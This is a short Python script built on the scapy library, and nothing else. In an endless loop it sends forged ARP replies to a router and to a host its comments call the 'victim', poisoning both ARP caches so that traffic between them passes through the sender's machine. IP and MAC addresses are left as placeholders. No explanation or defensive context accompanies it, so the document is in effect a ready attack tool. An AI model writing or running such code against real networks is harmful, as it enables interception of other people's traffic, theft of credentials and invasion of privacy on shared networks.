from scapy.all import ARP, Ether, sendp
import time

def send_arp_reply(target_ip, target_mac, source_ip, source_mac):
    arp_reply = ARP(op=2, psrc=source_ip, pdst=target_ip, hwsrc=source_mac, hwdst=target_mac)
    ethernet_frame = Ether(dst=target_mac, src=source_mac) / arp_reply
    sendp(ethernet_frame, iface='Wi-Fi', verbose=False)
  
while True:
    send_arp_reply('xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx', 'xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx')
    #                 Router IP          Router MAC           Victim IP          Your MAC
    send_arp_reply('xxx.xxx.xxx.xxx','xx:xx:xx:xx:xx:xx','xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx')
    #                 Victim IP          Victim MAC           Router IP          Your MAC
    time.sleep(15)
